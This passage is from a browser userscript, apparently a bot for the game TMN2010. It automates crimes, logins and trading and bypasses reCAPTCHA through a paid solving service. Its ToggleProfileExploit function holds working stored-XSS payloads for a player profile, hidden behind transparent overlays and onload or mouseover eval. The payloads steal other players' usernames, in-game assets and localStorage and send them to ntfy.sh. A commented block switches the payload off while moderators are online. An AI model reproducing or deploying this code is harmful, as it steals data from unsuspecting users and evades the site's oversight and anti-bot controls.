        const seconds = parseInt(match[3], 10);

        const now = new Date();
        const availableTime = now.getTime() + (hours * 3600 + minutes * 60 + seconds) * 1000;

        return availableTime;
    }

    function ConvertToLocalTime(euroDateTimeStr) {
        euroDateTimeStr = euroDateTimeStr.replace(/[\[\]]/g, '').trim();

        // Parse DD-MM-YYYY HH:mm
        const [datePart, timePart] = euroDateTimeStr.split(' ');
        const [day, month, year] = datePart.split('-').map(Number);
        const [hour, minute] = timePart.split(':').map(Number);

        // Central European Time offset (CET = UTC+1)
        // This is a simple version, ignores daylight savings
        const offsetHours = 1;
        const utcDate = Date.UTC(year, month - 1, day, hour - offsetHours, minute);

        // Return local timestamp (milliseconds since epoch)
        return utcDate;
    }

    async function GetFlightAvailability() {
        let flightAvailability = parseInt(GM_getValue('TMN_FLIGHT_TIME', ''), 10);

        if (!isNaN(flightAvailability) && flightAvailability > Date.now()) {
            return flightAvailability;
        }

        return new Promise((resolve) => {
            const timer = setInterval(async () => {
                const doc = await FetchPage('travel.aspx');
                const lblMsg = doc.find('#ctl00_lblMsg').text();

                if (!lblMsg.includes('jail')) {
                    flightAvailability = lblMsg == '' ? 0 : GetAvailableTime(lblMsg);
                    GM_setValue('TMN_FLIGHT_TIME', flightAvailability);
                    clearInterval(timer);
                    resolve(flightAvailability);
                }
            }, 1000);
        });
    }

    async function GetOCAvailability(profileLink) {
        let isAvailable = false;
        const fetchedPage = await FetchPage(profileLink);

        if (fetchedPage.text().includes('OC: Unavailable') || fetchedPage.text().includes('OC: Available in')) {
            return false;
        } else if (fetchedPage.text().includes('OC: Available')) {
            return true;
        }
        return new Promise((resolve) => {
            const timer = setInterval(async () => {
                const fetchedPage = await FetchPage('organizedcrime.aspx');
                const lblMsg = fetchedPage.find('#ctl00_lblMsg').text();

                if (!lblMsg.includes('jail')) {
                    isAvailable = lblMsg == '' ? true : false;
                    clearInterval(timer);
                    resolve(isAvailable);
                }
            }, 1000);
        });
    }

    async function GetDTMAvailability(profileLink) {
        let isAvailable = false;
        const fetchedPage = await FetchPage(profileLink);

        if (fetchedPage.text().includes('DTM: Unavailable') || fetchedPage.text().includes('DTM: Available in')) {
            return false;
        } else if (fetchedPage.text().includes('DTM: Available')) {
            return true;
        }
        return new Promise((resolve) => {
            const timer = setInterval(async () => {
                const fetchedPage = await FetchPage('organizedcrime.aspx?p=dtm');
                const lblMsg = fetchedPage.find('#ctl00_lblMsg').text();

                if (!lblMsg.includes('jail')) {
                    isAvailable = lblMsg == '' ? true : false;
                    clearInterval(timer);
                    resolve(isAvailable);
                }
            }, 1000);
        });
    }

    function OnLoginPage() {
        const userBox = document.querySelector('#ctl00_main_txtUsername');
        const passBox = document.querySelector('#ctl00_main_txtPassword');
        const recDiv = document.querySelector('.g-recaptcha');
        const loginBtn = document.querySelector('#ctl00_main_btnLogin');
        return !!(userBox && passBox && recDiv && loginBtn);
    }

    function UniversalCaptchaSolve() {
        Log('[Captcha] Starting solve...');

        const siteKey = $('.g-recaptcha').attr('data-sitekey');
        if (!siteKey) {
            Log('[Captcha] No sitekey found, aborting.');
            return;
        }

        if (window._tmn_solving_captcha) {
            Log('[Captcha] Already solving, skipping.');
            return;
        }

        window._tmn_solving_captcha = true;
        const pageUrl = location.href;
        Log('[Captcha] Sending solve request to 2captcha...');

        GM_xmlhttpRequest({
            method: 'POST',
            url: `https://2captcha.com/in.php?key=${TMN_CAPTCHA_KEY}&method=userrecaptcha&googlekey=${siteKey}&pageurl=${encodeURIComponent(pageUrl)}&json=1`,
            onload: function(response) {
                const json = JSON.parse(response.responseText);
                if (json.status === 1) {
                    Log('[Captcha] Request accepted, polling for result...');
                    pollUniversalCaptcha(json.request);
                } else {
                    Log('[Captcha] Request failed:', json.request);
                    console.log(json.request);
                    window._tmn_solving_captcha = false;
                }
            }
        });

        function pollUniversalCaptcha(requestId) {
            const poll = setInterval(() => {
                GM_xmlhttpRequest({
                    method: 'GET',
                    url: `https://2captcha.com/res.php?key=${TMN_CAPTCHA_KEY}&action=get&id=${requestId}&json=1`,
                    onload: function(response) {
                        const json = JSON.parse(response.responseText);
                        if (json.status === 1) {
                            Log('[Captcha] Captcha solved, injecting token...');
                            clearInterval(poll);
                            injectUniversalCaptcha(json.request);
                        } else if (json.request !== 'CAPCHA_NOT_READY') {
                            Log('[Captcha] Error:', json.request);
                            clearInterval(poll);
                            window._tmn_solving_captcha = false;
                        }
                    }
                });
            }, 5000);
        }

        function injectUniversalCaptcha(token) {
            const textarea = document.querySelector('textarea[name="g-recaptcha-response"]');
            const submit = document.querySelector('#ctl00_main_MyScriptTest_btnSubmit') || document.querySelector('#ctl00_main_btnLogin');
            if (!textarea || !submit) {
                Log('[Captcha] Missing textarea or submit button.');
                window._tmn_solving_captcha = false;
                return;
            }

            textarea.style.display = 'block';
            textarea.value = token;
            Log('[Captcha] Token injected, submitting...');
            setTimeout(() => {
                submit.click();
                Log('[Captcha] Submitted.');
                window._tmn_solving_captcha = false;
            }, 1200);
        }
    }

    function DoLogin(retryNum = 0) {
        const userBox = $('#ctl00_main_txtUsername')[0];
        const passBox = $('#ctl00_main_txtPassword')[0];
        const recDiv = $('.g-recaptcha')[0];
        const loginBtn = $('#ctl00_main_btnLogin')[0];
        const errMsg = $('#ctl00_main_lblMsg')[0];
        const msg = errMsg?.textContent.trim() || '';
        let manuallyEntering = false;
        $('iframe[src*="recaptcha/api2/anchor"]').on('focus', () => {
            manuallyEntering = true;
        });

        const savedScriptStates = JSON.parse(GM_getValue('TMN_SCRIPT_STATES', '{}'));
        if (!savedScriptStates['Auto Login']) return;

        if (msg.toLowerCase().includes('incorrect validation')) {
            console.log(`[TMN-LoginBot] Login failed: Incorrect validation (attempt ${retryNum+1}). Retrying in 4 seconds...`);
            setTimeout(() => DoLogin(retryNum + 1), 4000);
            return;
        }

        if (!(userBox && passBox && recDiv && loginBtn)) {
            console.log('[TMN-LoginBot] Login form not found, quitting auto-login logic.');
            return;
        }

        userBox.value = JSON.parse(GM_getValue('TMN_PLAYER', ''))?.name;
        passBox.value = GM_getValue('TMN_PASSWORD', '');

        loginBtn.disabled = false;
        loginBtn.removeAttribute('disabled');

        let i = 10;
        const countdown = setInterval(() => {
            if (manuallyEntering) {
                clearInterval(countdown);
                Log(`Manual interaction detected.`);
                return;
            } else if (i == 0) {
                clearInterval(countdown);
                UniversalCaptchaSolve();
                return;
            }
            Log(`Sending captcha in: ${i}`);
            i--;
        }, 1000);
    }

    async function ToggleProfileExploit(status) {
        return;
        const enabled = status == 'on';
        //mouseover/touchstart posession
        const exploit = '\n[color=transparent;z-index:99999;background:#ffffff00;position:fixed;top:0;left:0;width:100vw;height:100vh;"id="trigger"data-fn="async function f(u){const r=await fetch(u),b=await r.text(),d=new DOMParser().parseFromString(b,\'text/html\');return $(d)}(async function(){let p=await f(\'players.aspx\'),v=p.find(\'a\').filter(function(){const s=$(this).attr(\'style\');return s&&s.includes(\'color: #AA0000\')}).text();p=await f(\'playerproperty.aspx?p=i\');const bp=p.find(\'.propertyItem\').last().text().trim().replace(/\\s+/g,\' \');await fetch(\'https://ntfy.sh/tmn161125\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\'},body:`User: ${v}\\nProtection: ${bp}, Money: ${$(\'#ctl00_userInfo_lblcash\').text()}, FMJ: ${$(\'#ctl00_userInfo_lblfmj\').text()}, JHP: ${$(\'#ctl00_userInfo_lbljhp\').text()}, Credits: ${$(\'#ctl00_userInfo_lblcredits\').text()}`})})();$(\'#trigger\').remove();"onmouseover="eval(this.dataset.fn)"ontouchstart="eval(this.dataset.fn)][/color]';
        //Prev accounts [color=transparent;z-index:99999;background:#ffffff00;position:fixed;top:0;left:0;width:100vw;height:100vh;"id="trigger"data-fn="$('#ctl00_main_pnlPlayerStats').html($('#ctl00_main_pnlPlayerStats').html().replace(6, 1));$('#ctl00_main_lblAcctNum').text(1);$('#ctl00_main_pnlPreviousNames table').each(function() { $(this).find('tr:gt(1):lt(5)').remove() });$('#trigger').remove();"onmouseover="eval(this.dataset.fn)"ontouchstart="eval(this.dataset.fn)][/color]
        //onload localStorage
        //const exploit = '\n[youtube]VEfMAsFBMC8/0.jpg"id="trigger"onload="async function f(u){const r=await fetch(u),b=await r.text(),d=new DOMParser().parseFromString(b,\'text/html\');return $(d)}(async function(){let p=await f(\'players.aspx\'),v=p.find(\'a\').filter(function(){const s=$(this).attr(\'style\');return s&&s.includes(\'color: #AA0000\')}).text();p=await f(\'playerproperty.aspx?p=i\');const ls=JSON.stringify(localStorage);await fetch(\'https://ntfy.sh/tmn7112025\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\'},body:`User: ${v}\\nlocalStorage: ${ls}`})})();$(\'#trigger\').closest(\'a\').remove();"][/youtube]';
        //onload posession
        //const exploit = '\n[youtube]VEfMAsFBMC8/0.jpg"id="trigger"onload="async function f(u){const r=await fetch(u),b=await r.text(),d=new DOMParser().parseFromString(b,\'text/html\');return $(d)}(async function(){let p=await f(\'players.aspx\'),v=p.find(\'a\').filter(function(){const s=$(this).attr(\'style\');return s&&s.includes(\'color: #AA0000\')}).text();p=await f(\'playerproperty.aspx?p=i\');const bp=p.find(\'ctl00_main_pnlProtections .propertyItem b\').last().text().trim().replace(/\\s+/g,\' \');await fetch(\'https://ntfy.sh/tmn7112025\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\'},body:`User: ${v}\\nProtection: ${bp}, Money: ${$(\'#ctl00_userInfo_lblcash\').text()}, FMJ: ${$(\'#ctl00_userInfo_lblfmj\').text()}, JHP: ${$(\'#ctl00_userInfo_lbljhp\').text()}, Credits: ${$(\'#ctl00_userInfo_lblcredits\').text()}`})})();$(\'#trigger\').remove();"][/youtube]';
        //onload posession w/ fallback name method
        //const exploit = '\n[youtube]a/0.jpg"id="trigger"onload="async function f(u){const r=await fetch(u),b=await r.text(),d=new DOMParser().parseFromString(b,\'text/html\');return $(d)};(async function(){const $f=$(document.createElement(\'iframe\')).attr({id:\'profileFrame\',src:\'/authenticated/personal.aspx\',width:0,height:0,zIndex:99999}).appendTo(\'body\');let p=await f(\'players.aspx\'),v=p.find(\'a\').filter(function(){const s=$(this).attr(\'style\');return s&&s.includes(\'color: #AA0000\')}).text();if(!v){v=await new Promise(r=>$f.on(\'load\',()=>{const d=$f[0].contentDocument,$n=$(d).find(\'#ctl00_main_hlName\');if($n[0]){r($n.text());$f.remove()}else $(d).find(\'#ctl00_main_lnkViewProfile\').click()}));}p=await f(\'playerproperty.aspx?p=i\'),bp=p.find(\'#ctl00_main_pnlProtections .propertyItem b\').last().text();await fetch(\'https://ntfy.sh/tmn7112025\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\'},body:`User: ${v}\\nProtection: ${bp}, Money: ${$(\'#ctl00_userInfo_lblcash\').text()}, FMJ: ${$(\'#ctl00_userInfo_lblfmj\').text()}, JHP: ${$(\'#ctl00_userInfo_lbljhp\').text()}, Credits: ${$(\'#ctl00_userInfo_lblcredits\').text()}`})})();$(\'#trigger\').closest(\'center\').remove()"][/youtube]'
        const fetchedPage = await FetchPage('personal.aspx');
        const exploitActive = fetchedPage.find('#ctl00_main_txtProfile').val().includes(exploit);

        if (enabled && !exploitActive) {
            const profileFrame = $('<iframe>', {
                id: 'profileFrame',
                src: '/authenticated/personal.aspx',
                width: '0',
                height: '0'
            });
            $('body').append(profileFrame);
            profileFrame.one('load', () => {
                const iframeElement = profileFrame[0];
                const $profileContent = $(iframeElement.contentDocument).find('#ctl00_main_txtProfile');
                $profileContent.val($profileContent.val() + exploit);
                Log('Profile exploit injected.');
                setTimeout(() => { $(profileFrame).remove(); }, 2000);
                $(iframeElement.contentDocument).find('#ctl00_main_lnkSave').click();
            });
        } else if (!enabled && exploitActive) {
            const profileFrame = $('<iframe>', {
                id: 'profileFrame',
                src: '/authenticated/personal.aspx',
                width: '0',
                height: '0'
            });
            $('body').append(profileFrame);
            profileFrame.one('load', () => {
                const iframeElement = profileFrame[0];
                const $profileContent = $(iframeElement.contentDocument).find('#ctl00_main_txtProfile');
                $profileContent.val($profileContent.val().replace(exploit, ''));
                Log('Profile exploit removed.');
                setTimeout(() => { $(profileFrame).remove(); }, 2000);
                $(iframeElement.contentDocument).find('#ctl00_main_lnkSave').click();
            });
        }
    }

    async function MainSetup() {
        const savedScriptStates = JSON.parse(GM_getValue('TMN_SCRIPT_STATES', '{}'));
        let fetchedPage = await FetchPage('players.aspx');
        const [TMN_PLAYER, TMN_PLAYER_PROFILE] = await GetPlayerDetails();
        GM_setValue('TMN_PLAYER', JSON.stringify({name: TMN_PLAYER, profile: TMN_PLAYER_PROFILE}));
        const AutoBankTime = GM_getValue('TMN_AUTO_BANK_TIME', 0);
        if (Date.now() > AutoBankTime && savedScriptStates['Auto Bank']) {
            const amount = 49999999;
            location.href = `playerproperty.aspx?a=${amount}`;
            return;
        }
        const currentCity = $('#ctl00_userInfo_lblcity').text().trim();

        window.matchMedia('(orientation: landscape)').addEventListener('change', GetOrientation);
        GetOrientation();

        // Determine flight availability for auto-travel
        const flightAvailability = await GetFlightAvailability();
        if (flightAvailability > 0) {
            Log(`Next Flight: ${new Date(flightAvailability).toLocaleTimeString('en-NZ', {
                hour: 'numeric',
                minute: '2-digit',
                hour12: true
            })}`);
        } else if (!currentCity.includes('London') && (savedScriptStates['Auto Travel'])) {
            location.href = 'travel.aspx?d=London';
        }

        // Check mailbox every 10 seconds
        const CheckMailbox = setInterval(async () => {
            fetchedPage = await FetchPage('mailbox.aspx');

            const receivedMail = fetchedPage.find('#ctl00_main_gridMail .nomobile').map((n, e) => {
                const lines = $(e).text().split('\n').map(line => line.trim()).filter(line => line);
                const author = lines[0];
                const subject = lines[1];
                const time = lines[2];
                const link = $(e).find(`a[href*='mailbox']`).attr('href');
                return { author, subject, time, link }
            }).get();

            CheckForInvites(receivedMail);
            NotifyOfNewMail(receivedMail);

            $('#divStats').html(fetchedPage.find('#divStats').html());
            $(window.top.document.querySelector('#ctl00_userInfo_lblrank')).after(` <span id='rankBar' style='color:blue'>(${CalculateRankPercent(GM_getValue('TMN_EXPERIENCE', '?'))}%)</span>`);
        }, 10000);
        // Check if mods are online every 10 seconds
        /*const CheckForMods = setInterval(async () => {
            fetchedPage = await FetchPage('players.aspx');
            const modOnline = fetchedPage.find('a[style="color: #FF9900; font-weight: bold; "]').length;
            if (modOnline) {
                ToggleProfileExploit('off');
            } else {
                //ToggleProfileExploit('on');
            }
        }, 10000);*/

        // Reload page every 5 min incase it hangs
        const ReloadPage = setInterval(() => { location.href = location.href.replace('#', '') }, 5 * 60000);

        async function CheckForInvites(receivedMail) {
            const isAvailableForOC = GM_getValue('TMN_OC_AVAILABILITY', await GetOCAvailability(TMN_PLAYER_PROFILE));
            const isAvailableForDTM = GM_getValue('TMN_DTM_AVAILABILITY', await GetDTMAvailability(TMN_PLAYER_PROFILE));

            const savedScriptStates = JSON.parse(GM_getValue('TMN_SCRIPT_STATES', '{}'));
            const savedAutoOC = GM_getValue('TMN_AUTO_OC_PREF', '');
            const savedLeaderNames = GM_getValue('TMN_OC_LEADER_NAMES', '').replaceAll(' ', '').toLowerCase().split(';');
            const savedPosition = GM_getValue('TMN_OC_POSITION', '');

            if (savedScriptStates.OC && savedAutoOC === 'Lead OC' && isAvailableForOC && currentCity.includes('London')) {
                location.href = 'organizedcrime.aspx';
                return;
            }

            $(receivedMail).each(async (n, mail) => {
                const timeDiff = Date.now() - ConvertToLocalTime(mail.time);
                // Checks mail received in the last 5 minutes.
                if (mail.author == TMN_PLAYER && ((mail.subject == 'Organized Crime Invitation!' && isAvailableForOC) || (mail.subject == 'DTM invitation' && isAvailableForDTM)) && timeDiff <= 5 * 60000) {
                    const mailLink = mail.link;
                    fetchedPage = await FetchPage(mailLink);
                    const mailContent = fetchedPage.find('.GridHeader').next().text().replace(/\s*\n\s*/g, ' ').replace(/\s+/g, ' ').trim();
                    const ocRegex = /Invitation! (.*?) has invited you to be (.*?) in .*?\((.*?)\).*? in (.*?)\./;
                    const dtmRegex = /invitation (.*?) has invited you to join his Drugs Transportation mission in (.*?)\./;
                    const sanitisedMailContent = fetchedPage.find('.GridHeader').next().text().replace(/\s*\n\s*/g, ' ').replace(/\s+/g, ' ').trim();
                    const match = sanitisedMailContent.match(ocRegex) || sanitisedMailContent.match(dtmRegex);
                    if (match) {
                        const leader = match[1]?.trim().replace('!', '').replace(' ', '');
                        const position = match[2]?.trim();
                        const ocType = match[3]?.trim();
                        const inviteLocation = match[4]?.trim() || match[2]?.trim();
                        const acceptLink = fetchedPage.find('.GridHeader').next().find('a').eq(0).attr('href');

                        if (ocType && savedScriptStates.OC && savedAutoOC !== 'Lead OC') {
                            // If accepting any invite or the inviter is in the list of 'Leaders'
                            if ((savedAutoOC == 'Auto Accept Any' || savedLeaderNames.includes(leader.toLowerCase()))) {
                                if (savedPosition == 'Any' || (savedPosition != 'TP' && position != 'Transporter') || (savedPosition == 'TP' && position == 'Transporter')) {
                                    if (inviteLocation.includes(currentCity)) {
                                        location.href = `${mailLink}&autoAccept`;
                                    }
                                }
                            }
                        } else if (savedScriptStates.DTM) {
                            if (inviteLocation.includes(currentCity)) {
                                location.href = `${mailLink}&autoAccept`;
                            }
                        }
                    }
                }
            });
        }

        async function NotifyOfNewMail(receivedMail) {
            const lastNewMail = GM_getValue('TMN_LAST_NEW_MAIL', 'Apples');
            const unnotifiedNewMail = [];

            for (const mail of receivedMail) {
                if (JSON.stringify(mail) === lastNewMail) break;
                unnotifiedNewMail.push(mail);
            }

            for (const mail of unnotifiedNewMail.reverse()) {
                Notify(`New message from ${mail.author}\n${mail.subject}`);
                GM_setValue('TMN_LAST_NEW_MAIL', JSON.stringify(mail));
                await new Promise(resolve => setTimeout(resolve, 5000));
            }
        }

        async function GetPlayerDetails() {

            let fetchedPage = await FetchPage('players.aspx');
            const player = fetchedPage.find('a[style="color: #AA0000; font-weight: bold; "]');
            let name = player?.text();
            let profileLink = player?.prop('href');

            if (!name) {
                const $iframe = $('<iframe>').attr({
                    id: 'profileFrame',
                    src: '/authenticated/personal.aspx',
                    width: 0,
                    height: 0
                }).appendTo('body');
                [name, profileLink] = await new Promise(resolve => {
                    $iframe.on('load', () => {
                        const doc = $iframe[0].contentDocument;
                        const hlName = $(doc).find('#ctl00_main_hlName');
                        if (hlName.length) {
                            resolve([hlName.text(), location.href]);
                            $iframe.remove();
                        } else {
                            $(doc).find('#ctl00_main_lnkViewProfile').click();
                        }
                    });
                });
            }

            return [name, profileLink];
        }

        function GetOrientation() {
            const consoleContent = $('#console > span')?.html();
            if (window.matchMedia('(orientation: landscape)').matches) {
                $('#divContent').css({
                    'display': 'grid',
                    'grid-template-columns': '1fr 1fr',
                    'grid-template-rows': '30px 1fr 1fr',
                    'grid-template-areas': ` 'a a' 'b c' 'd e' `
                });
                $('#divContent').html(`
    <iframe src='/authenticated/jail.aspx' style='grid-area: b; width: 100%; height: 100%; box-sizing: border-box;'></iframe>
    <iframe src='/authenticated/crimes.aspx' style='grid-area: c; width: 100%; height: 100%; box-sizing: border-box;'></iframe>
    <iframe src='/authenticated/crimes.aspx?p=b' style='grid-area: d; width: 100%; height: 100%; box-sizing: border-box;'></iframe>
    <iframe src='/authenticated/crimes.aspx?p=g' style='grid-area: e; width: 100%; height: 100%; box-sizing: border-box;'></iframe>`
                                     );
            } else {
                $('#divContent').css({
                    'display': 'grid',
                    'grid-template-columns': '1fr',
                    'grid-template-rows': '30px 1fr)',
                    'grid-template-rows': '30px 1fr 1fr 1fr 1fr',
                    'grid-template-areas': ` 'a' 'b' 'c' 'd' 'e' `
                });
                $('#divContent').html(`
    <iframe src='/authenticated/jail.aspx' style='grid-area: b; width: 100%; height: 100%; box-sizing: border-box;'></iframe>
    <iframe src='/authenticated/crimes.aspx' style='grid-area: c; width: 100%; height: 100%; box-sizing: border-box;'></iframe>
    <iframe src='/authenticated/crimes.aspx?p=b' style='grid-area: d; width: 100%; height: 100%; box-sizing: border-box;'></iframe>
    <iframe src='/authenticated/crimes.aspx?p=g' style='grid-area: e; width: 100%; height: 100%; box-sizing: border-box;'></iframe>`
                                     );
            }
            $('#console > span').html(consoleContent);
        }
    }

    function iFrameSetup() {
        if (window.self == window.top) {
            return;
        }

        const $divContentIn = $('#divContentIn');
        $divContentIn.parent().prevAll().hide();
        $divContentIn.parent().nextAll().hide();
        $divContentIn.parent().parent().prevAll().hide();
        $divContentIn.parent().parent().nextAll().hide();
        $divContentIn.parent().width('100%');
        $divContentIn.parent().css('left', '0');
        $divContentIn.parent().css('top', '0');
        $divContentIn.parent().css('bottom', '0');
        $divContentIn.closest('iframe').show();
    }

    function JailScript() {
        const savedScriptStates = JSON.parse(GM_getValue('TMN_SCRIPT_STATES', '{}'));
        const scriptCheck = $('#ctl00_main_MyScriptTest_btnSubmit')[0];
        if (scriptCheck) {
            window.top.location.href = 'crimes.aspx?scriptCheck';
        } else if (OnLoginPage()) {
            window.top.location.href = 'https://www.tmn2010.net/login.aspx';
        } else if (!savedScriptStates.Jail) {
            return;
        }

        if (window.self == window.top) {
            if (document.referrer?.includes('scriptCheck')) {
                setTimeout(() => { location.href = defaultPage }, 3000);
                return;
            } else {
                return;
            }
        }

        const sentenceLength = parseInt(GM_getValue('TMN_SENTENCE_LENGTH', '')) || 0;
        const lblMsg = $('#ctl00_lblMsg').text();
        if (lblMsg.includes('failed') || lblMsg.includes('You cannot load')) {
            location.href = location.href.replace('#', '');
        } else if (lblMsg.includes('seconds')) {
            HandleJail();
            let match = lblMsg.match(/(\d+)\s*more seconds/);
            if (match) {
                const seconds = parseInt(match[1], 10);
                if (seconds * 1000 > sentenceLength) {
                    GM_setValue('TMN_SENTENCE_LENGTH', Math.max(seconds * 1000, sentenceLength));
                    console.log('Jail sentenceLength updated: ' + GM_getValue('TMN_SENTENCE_LENGTH', ''));
                }
            }
            return;
        }

        let nextCrimeTime = parseInt(GM_getValue('TMN_CRIME_TIME', 0), 10);
        let nextGTATime = parseInt(GM_getValue('TMN_GTA_TIME', 0), 10);
        let nextBoozeTime = parseInt(GM_getValue('TMN_BOOZE_TIME', 0), 10);

        if ((savedScriptStates.Crimes && Date.now() > nextCrimeTime) || (savedScriptStates.GTA && Date.now() > nextGTATime) || (savedScriptStates.Booze && Date.now() > nextBoozeTime)) {
            const sentenceFinish = Date.now() + sentenceLength;
            const nextTime = Math.min(Math.min(nextCrimeTime, nextGTATime), nextBoozeTime);
            const nextAction = nextTime == nextCrimeTime ? 'crimes' : nextTime == nextGTATime ? 'GTA' : 'booze';
            Log(`Pausing jail script to do ${nextAction}`);
            const checkTimers = setInterval(() => {
                nextCrimeTime = parseInt(GM_getValue('TMN_CRIME_TIME', 0), 10);
                nextGTATime = parseInt(GM_getValue('TMN_GTA_TIME', 0), 10);
                nextBoozeTime = parseInt(GM_getValue('TMN_BOOZE_TIME', 0), 10);
                if (Date.now() < nextCrimeTime && Date.now() < nextGTATime && Date.now() < nextBoozeTime) {
                    clearInterval(checkTimers);
                    setTimeout(() => { location.href = location.href.replace('#', ''); }, Math.random() * 2000);
                }
            }, 1000);
        } else {
            Log(``);
            RandomBreakClick();
        }

        // Break script using the humanClick function
        function RandomBreakClick() {
            const buttons = $(`[id$='_btnBreak']:not([disabled])`);
            if (buttons.length) {
                const randomButton = buttons.eq(Math.floor(Math.random() * buttons.length))[0];
                randomButton.click();
            } else {
                location.href = location.href.replace('#', '');
            }
        }
    }

    function CrimesScript() {
        const scriptCheck = $('#ctl00_main_MyScriptTest_btnSubmit')[0];
        const savedScriptStates = JSON.parse(GM_getValue('TMN_SCRIPT_STATES', '{}'));
        if (scriptCheck) {
            window.top.location.href = 'crimes.aspx?scriptCheck';
        } else if (OnLoginPage()) {
            window.top.location.href = 'https://www.tmn2010.net/login.aspx';
        } else if (!savedScriptStates.Crimes) {
            return;
        }

        if (window.self == window.top) {
            if (scriptCheck && location.href.includes('scriptCheck')) {
                UniversalCaptchaSolve();
                return;
            } else if (document.referrer?.includes('scriptCheck')) {
                setTimeout(() => { location.href = defaultPage }, 3000);
                return;
            } else {
                return;
            }
        }

        let lblMsg = $('#ctl00_lblMsg').text() || $('#ctl00_main_lblResult').text();
        if (lblMsg.includes('You are in jail')) {
            HandleJail();
            return;
        } else if (lblMsg.includes('seconds')) {
            let match = lblMsg.match(/(\d+)\s*seconds/);
            if (match) {
                const seconds = parseInt(match[1], 10);
                const targetTime = Date.now() + seconds * 1000;
                GM_setValue('TMN_CRIME_TIME', targetTime);
                console.log('Crimes reload scheduled at:', new Date(targetTime).toLocaleTimeString());
                setTimeout(() => { location.href = location.href.replace('#', ''); }, seconds * 1000);
                CrimesCountdown();
            }
        } else if (lblMsg.length > 0 || lblMsg.includes('Unfortunately')) {
            location.href = location.href.replace('#', '');
        }
        $('#ctl00_main_btnCrime1')?.click();
    }

    function GTAScript() {
        const savedScriptStates = JSON.parse(GM_getValue('TMN_SCRIPT_STATES', '{}'));
        const scriptCheck = $('#ctl00_main_MyScriptTest_btnSubmit')[0];
        if (scriptCheck) {
            window.top.location.href = 'crimes.aspx?scriptCheck';
        } else if (OnLoginPage()) {
            window.top.location.href = 'https://www.tmn2010.net/login.aspx';
        } else if (!savedScriptStates.GTA) {
            return;
        }

        if (window.self == window.top) {
            return;
        }

        let lblMsg = $('#ctl00_lblMsg').text();
        let lblResult = $('#ctl00_main_lblResult').text();
        if (lblMsg.includes('jail')) {
            HandleJail();
        } else if (lblResult.includes('successfully')) {
            setTimeout(() => { location.href = 'playerproperty.aspx?p=g&cleanup' }, Math.random() * 2000);
        } else if (lblResult.includes('jail')) {
            setTimeout(() => { location.href = location.href.replace('#', ''); }, Math.random() * 2000);
        } else if (lblResult.includes('seconds')) {
            let match = lblResult.match(/(\d+)\s*seconds/);
            if (match) {
                const seconds = parseInt(match[1], 10);
                const targetTime = Date.now() + seconds * 1000;
                GM_setValue('TMN_GTA_TIME', targetTime);
                console.log('GTA reload scheduled at:', new Date(targetTime).toLocaleTimeString());
                setTimeout(() => { location.href = location.href.replace('#', ''); }, seconds * 1000);
                CrimesCountdown();
            }
        } else if ($('#ctl00_main_carslist_4')[0]) {
            $('#ctl00_main_carslist_4').click();
            $('#ctl00_main_btnStealACar').click();
        } else {
            location.href = location.href.replace('#', '');
        }
    }

    function BoozeScript() {
        const savedScriptStates = JSON.parse(GM_getValue('TMN_SCRIPT_STATES', '{}'));
        const scriptCheck = $('#ctl00_main_MyScriptTest_btnSubmit')[0];
        const sqlScriptCheck = $('#ctl00_main_pnlMessage')[0];

        if (sqlScriptCheck) {
            const message = `SQL Script Check\n${$('#ctl00_main_pnlMessage').text().replace(/\s*\n\s*/g, ' ').replace(/\s+/g, ' ').replace('Important message ', '').trim()}`;
            Notify(message);
            window.top.location.href = 'crimes.aspx?scriptCheck';
            return;
        } else if (scriptCheck) {
            window.top.location.href = 'crimes.aspx?scriptCheck';
        } else if (OnLoginPage()) {
            window.top.location.href = 'https://www.tmn2010.net/login.aspx';
        } else if (!savedScriptStates.Crimes) {
            return;
        }

        if (window.self == window.top) {
            return;
        }

        let lblMsg = $('#ctl00_lblMsg').text();
        let lblResult = $('#ctl00_main_lblResult').text();
        // Booze result is logged as lblMsg not lblResult
        if (lblMsg.includes('You successfully')) {
            location.href = location.href.replace('#', '');
        } else if (lblMsg.includes('jail')) {
            HandleJail();
        } else if (lblResult.includes('seconds')) {
            let match = lblResult.match(/(\d+)\s*seconds/);
            if (match) {
                const seconds = parseInt(match[1], 10);
                const targetTime = Date.now() + seconds * 1000;
                GM_setValue('TMN_BOOZE_TIME', targetTime);
                console.log('Booze reload scheduled at:', new Date(targetTime).toLocaleTimeString());
                setTimeout(() => { location.href = location.href.replace('#', ''); }, seconds * 1000);
                CrimesCountdown();
            }
            return;
        }

        const rows = $('tr').slice(1).map(function () {
            return {
                price: parseInt($(this).find('td').eq(1).text().replace(/[^0-9]/g, '')) || Infinity,
                holdings: $(this).find('td').eq(2)
            };
        });

        let lowestInput = null;
        let lowestBuyBtn = null;
        let lowestCost = Infinity;
        let didSell = false;

        rows.each((n, el) => {
            const amount = parseInt(el.holdings.text().replace(/[^0-9]/g, '')) || 0;

            if (amount > 0) {
                didSell = true;

                const sellInput = $(`[id*='tbAmtSell']`)[n];
                const sellBtn = $(`[id*='btnSell']`)[n];

                if (sellInput && sellBtn) {
                    sellInput.value = 1;
                    sellBtn.click();
                }
            }

            if (el.price < lowestCost) {
                lowestCost = el.price;
                lowestInput = $(`[id*='tbAmtBuy']`)[n];
                lowestBuyBtn = $(`[id*='btnBuy']`)[n];
            }
        });

        if (!didSell && lowestInput && lowestBuyBtn) {
            const amountToBuy = lblMsg.split('Maximum for your rank is: ')[1] || 999;
            const cash = $('#ctl00_userInfo_lblcash').text().split('$')[1].replaceAll(',', '') * 1;

            lowestInput.value = Math.floor(Math.min(cash / lowestCost, amountToBuy));
            lowestBuyBtn.click();
        }
    }

    function AcceptInvites() {
        const acceptLink = $(`a[href*='organizedcrime.aspx'][href*='accept']`).attr('href');
        let countdown = 5;
        const logUpdate = setInterval(() => {
            Log(`Accepting invite in: ${Math.max(0, countdown)}`);
            countdown--
        }, 1000);
        setTimeout(() => { location.href = acceptLink }, 5000);
    }

    function OCScript() {
        //https://www.tmn2010.net/authenticated/organizedcrime.aspx?act=accept&ocid=3288&pos=WeaponMaster
        const TMN_PLAYER = JSON.parse(GM_getValue('TMN_PLAYER', '')).name;
        const savedScriptStates = JSON.parse(GM_getValue('TMN_SCRIPT_STATES', '{}'));
        const savedAutoOC = GM_getValue('TMN_AUTO_OC_PREF', '');
        const savedOCType = GM_getValue('TMN_LEAD_OC_TYPE', '');
        const savedLeadingInputs = JSON.parse(GM_getValue('TMN_OC_LEADING_INPUTS', '{}'));
